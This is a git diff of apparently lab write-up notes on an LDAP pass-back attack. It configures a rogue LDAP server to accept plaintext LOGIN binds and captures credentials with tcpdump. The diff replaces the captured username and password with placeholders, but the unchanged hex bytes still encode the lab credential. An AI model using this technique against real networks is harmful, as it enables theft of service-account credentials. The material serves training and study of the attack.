@@ -86,7 +86,7 @@ olcSaslSecProps: noanonymous,minssf=0,passcred
 
 <br/>
 
-- **Patching LDAP Server with Custom `.lidf` Configuration**
+- **Patching LDAP Server with Custom `.ldif` Configuration**
 
 ```batch
 :: Apply the Configuration
@@ -113,17 +113,14 @@ supportedSASLMechanisms: LOGIN
 
 ### Capturing LDAP Credentials
 
-- **LDAP Credentials:** <b style={{ color: 'Chartreuse' }}>svcLDAP</b><b style={{ color: 'Grey' }}>:</b><b style={{ color: 'Coral' }}>tryhackmeldappass1@</b>
-
-```batch {9-10}
+```batch {8-9}
 tcpdump -SX -i <NetworkInterface> tcp port 389
 
 :: Response
 0x0000:  4500 0069 ffd8 4000 7f06 35bf 0ac8 59c9  E..i..@...5...Y.
 0x0010:  0a32 5734 d97e 0185 f5fa 95b9 a45e c0ed  .2W4.~.......^..
 0x0020:  5018 0400 3ef3 0000 3084 0000 003b 0201  P...>...0....;..
-0x0030:  1060 8400 0000 3202 0102 0418 7a61 2e74  .`....2.....za.t
-0x0040:  7279 6861 636b 6d65 2e63 6f6d 5c73 7663  ryhackme.com\svc
-0x0050:  4c44 4150 8013 7472 7968 6163 6b6d 656c  LDAP..tryhackmel
-0x0060:  6461 7070 6173 7331 40                   dappass1@
+0x0030:  1060 8400 0000 3202 0102 0418 7a61 2e74  .`....2...dc.dom
+0x0040:  7279 6861 636b 6d65 2e63 6f6d 5c73 7663  ain.com\USERNAME
+0x0050:  4c44 4150 8013 7472 7968 6163 6b6d 656c  ........PASSWORD
 ```
